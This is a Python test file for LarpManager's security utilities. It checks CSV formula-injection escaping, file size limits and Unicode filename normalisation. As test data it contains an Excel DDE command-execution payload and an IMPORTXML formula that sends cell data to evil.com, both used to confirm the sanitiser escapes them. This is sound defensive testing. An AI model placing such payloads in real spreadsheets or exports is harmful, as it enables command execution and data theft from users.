# LarpManager - https://larpmanager.com
# Copyright (C) 2025 Scanagatta Mauro
#
# This file is part of LarpManager and is dual-licensed:
#
# 1. Under the terms of the GNU Affero General Public License (AGPL) version 3,
#    as published by the Free Software Foundation. You may use, modify, and
#    distribute this file under those terms.
#
# 2. Under a commercial license, allowing use in closed-source or proprietary
#    environments without the obligations of the AGPL.
#
# If you have obtained this file under the AGPL, and you make it available over
# a network, you must also make the complete source code available under the same license.
#
# For more information or to purchase a commercial license, contact:
# commercial@larpmanager.com
#
# SPDX-License-Identifier: AGPL-3.0-or-later OR Proprietary
"""Tests for CSV and file security validation."""

from __future__ import annotations

from unittest.mock import Mock

import pandas as pd
import pytest

from larpmanager.utils.security import (
    FileSecurityError,
    normalize_filename,
    safe_filename,
    sanitize_csv_value,
    sanitize_dataframe,
    validate_file_size,
)


class TestCsvFormulaInjectionProtection:
    """Test CSV formula injection protection."""

    def test_sanitize_formula_equals(self) -> None:
        """Test that formulas starting with = are escaped."""
        result = sanitize_csv_value("=SUM(A1:A10)")
        assert result == "'=SUM(A1:A10)"

    def test_sanitize_formula_plus(self) -> None:
        """Test that formulas starting with + are escaped."""
        result = sanitize_csv_value("+1234567890")
        assert result == "'+1234567890"

    def test_sanitize_formula_minus(self) -> None:
        """Test that formulas starting with - are escaped."""
        result = sanitize_csv_value("-5*10")
        assert result == "'-5*10"

    def test_sanitize_formula_at(self) -> None:
        """Test that formulas starting with @ are escaped."""
        result = sanitize_csv_value("@function()")
        assert result == "'@function()"

    def test_sanitize_formula_pipe(self) -> None:
        """Test that formulas starting with | are escaped."""
        result = sanitize_csv_value("|cmd")
        assert result == "'|cmd"

    def test_sanitize_formula_tab(self) -> None:
        """Test that formulas starting with tab are escaped."""
        result = sanitize_csv_value("\t=SUM(A1)")
        assert result == "'\t=SUM(A1)"

    def test_sanitize_normal_text(self) -> None:
        """Test that normal text is not modified."""
        result = sanitize_csv_value("normal text")
        assert result == "normal text"

    def test_sanitize_empty_string(self) -> None:
        """Test that empty strings are not modified."""
        result = sanitize_csv_value("")
        assert result == ""

    def test_sanitize_number(self) -> None:
        """Test that numeric values are not modified."""
        result = sanitize_csv_value(123)
        assert result == 123

    def test_sanitize_none(self) -> None:
        """Test that None values are not modified."""
        result = sanitize_csv_value(None)
        assert result is None

    def test_sanitize_command_injection(self) -> None:
        """Test protection against command injection via DDE."""
        dangerous = "=cmd|'/c calc'!A1"
        result = sanitize_csv_value(dangerous)
        assert result == "'=cmd|'/c calc'!A1"

    def test_sanitize_dataframe(self) -> None:
        """Test sanitization of entire DataFrame."""
        df = pd.DataFrame(
            {
                "name": ["Alice", "=SUM(A1:A10)", "Bob"],
                "email": ["alice@example.com", "+1234567890", "bob@example.com"],
                "value": [100, 200, 300],
            }
        )

        sanitized = sanitize_dataframe(df)

        assert sanitized.loc[0, "name"] == "Alice"
        assert sanitized.loc[1, "name"] == "'=SUM(A1:A10)"
        assert sanitized.loc[0, "email"] == "alice@example.com"
        assert sanitized.loc[1, "email"] == "'+1234567890"
        assert sanitized.loc[0, "value"] == 100


class TestFileSizeValidation:
    """Test file size validation."""

    def test_validate_size_within_limit(self) -> None:
        """Test that files within size limit are accepted."""
        mock_file = Mock()
        mock_file.size = 1024  # 1 KB
        validate_file_size(mock_file, max_size=10 * 1024)  # 10 KB limit
        # Should not raise

    def test_validate_size_exceeds_limit(self) -> None:
        """Test that oversized files are rejected."""
        mock_file = Mock()
        mock_file.size = 20 * 1024  # 20 KB

        with pytest.raises(FileSecurityError, match="exceeds maximum"):
            validate_file_size(mock_file, max_size=10 * 1024)  # 10 KB limit

    def test_validate_size_no_size_attribute(self) -> None:
        """Test handling of files without size attribute."""
        mock_file = Mock(spec=[])  # No attributes

        with pytest.raises(FileSecurityError, match="Cannot determine file size"):
            validate_file_size(mock_file, max_size=10 * 1024)

    def test_validate_size_with_file_object(self) -> None:
        """Test size validation using nested file object."""
        mock_inner_file = Mock()
        mock_inner_file.size = 5 * 1024  # 5 KB

        mock_file = Mock(spec=["file"])
        mock_file.file = mock_inner_file
        del mock_file.size  # Remove size attribute from outer object

        validate_file_size(mock_file, max_size=10 * 1024)  # Should not raise

    def test_validate_size_default_limit(self) -> None:
        """Test that default size limit is used when not specified."""
        mock_file = Mock()
        mock_file.size = 1024  # 1 KB
        validate_file_size(mock_file)  # Should use default limit (10 MB)


class TestUnicodeFilenameNormalization:
    """Test Unicode filename normalization."""

    def test_normalize_cyrillic_lookalike(self) -> None:
        """Test normalization of Cyrillic characters that look like Latin."""
        # Cyrillic 'а' (U+0430) looks like Latin 'a' (U+0061)
        filename = "file\u0430.txt"  # Cyrillic a
        normalized = normalize_filename(filename)
        # NFKC doesn't change Cyrillic to Latin, but ensures consistent form
        assert normalized == "file\u0430.txt"

    def test_normalize_fullwidth_characters(self) -> None:
        """Test normalization of fullwidth characters to ASCII."""
        # Fullwidth digit '１' (U+FF11) -> Regular '1' (U+0031)
        filename = "file\uff11.txt"
        normalized = normalize_filename(filename)
        assert normalized == "file1.txt"

    def test_normalize_circled_digits(self) -> None:
        """Test normalization of circled digits."""
        # Circled digit '①' (U+2460) -> Regular '1'
        filename = "file\u2460.txt"
        normalized = normalize_filename(filename)
        assert normalized == "file1.txt"

    def test_normalize_subscript_superscript(self) -> None:
        """Test normalization of subscript/superscript characters."""
        # Superscript '²' (U+00B2) -> '2'
        filename = "file\u00b2.txt"
        normalized = normalize_filename(filename)
        assert normalized == "file2.txt"

    def test_normalize_already_normal(self) -> None:
        """Test that normal ASCII filenames are unchanged."""
        filename = "normal_file.txt"
        normalized = normalize_filename(filename)
        assert normalized == filename

    def test_safe_filename_truncation(self) -> None:
        """Test that long filenames are truncated while preserving extension."""
        long_name = "a" * 300 + ".txt"
        safe = safe_filename(long_name, max_length=255)

        assert len(safe) == 255
        assert safe.endswith(".txt")
        assert safe.startswith("a")

    def test_safe_filename_unicode_and_length(self) -> None:
        """Test combined Unicode normalization and length limiting."""
        # Use fullwidth characters that will be normalized
        long_name = "\uff11" * 300 + ".txt"  # Fullwidth '1' repeated
        safe = safe_filename(long_name, max_length=255)

        assert len(safe) <= 255
        assert safe.endswith(".txt")
        assert "\uff11" not in safe  # Fullwidth chars should be normalized

    def test_safe_filename_extension_too_long(self) -> None:
        """Test handling when extension itself exceeds max length."""
        filename = "file" + ".txt" * 100  # Very long extension
        safe = safe_filename(filename, max_length=20)

        assert len(safe) <= 20


class TestMemoryExhaustionProtection:
    """Test protection against memory exhaustion attacks."""

    def test_large_file_rejected(self) -> None:
        """Test that excessively large files are rejected."""
        # Create a mock file that claims to be 100 MB
        mock_file = Mock()
        mock_file.size = 100 * 1024 * 1024  # 100 MB

        with pytest.raises(FileSecurityError, match="exceeds maximum"):
            validate_file_size(mock_file, max_size=10 * 1024 * 1024)  # 10 MB limit

    def test_reasonable_file_accepted(self) -> None:
        """Test that reasonable sized files are accepted."""
        # Create a small file
        content = b"test,data\n1,2\n3,4\n"
        mock_file = Mock()
        mock_file.size = len(content)

        validate_file_size(mock_file, max_size=10 * 1024 * 1024)  # Should not raise


class TestIntegrationScenarios:
    """Test realistic attack scenarios."""

    def test_excel_dde_attack(self) -> None:
        """Test protection against Excel DDE attack."""
        # Real-world DDE attack payload
        dangerous_csv = pd.DataFrame(
            {
                "username": ["=cmd|'/c calc'!A1", "normal_user"],
                "email": ["attacker@evil.com", "user@example.com"],
            }
        )

        sanitized = sanitize_dataframe(dangerous_csv)

        # DDE payload should be escaped
        assert sanitized.loc[0, "username"] == "'=cmd|'/c calc'!A1"
        # Normal data unchanged
        assert sanitized.loc[1, "username"] == "normal_user"

    def test_data_exfiltration_attempt(self) -> None:
        """Test protection against data exfiltration via external references."""
        dangerous = "=IMPORTXML(CONCAT(\"http://evil.com/?\",A1:A100),\"//\")"
        result = sanitize_csv_value(dangerous)
        assert result.startswith("'")

    def test_combined_unicode_and_formula(self) -> None:
        """Test combined Unicode obfuscation and formula injection."""
        # Use fullwidth equals sign to try to bypass detection
        dangerous = "\uff1dSUM(A1:A10)"  # Fullwidth '='
        normalized = normalize_filename(dangerous)
        # Fullwidth = should normalize to regular =
        assert "=" in normalized or normalized.startswith("'")
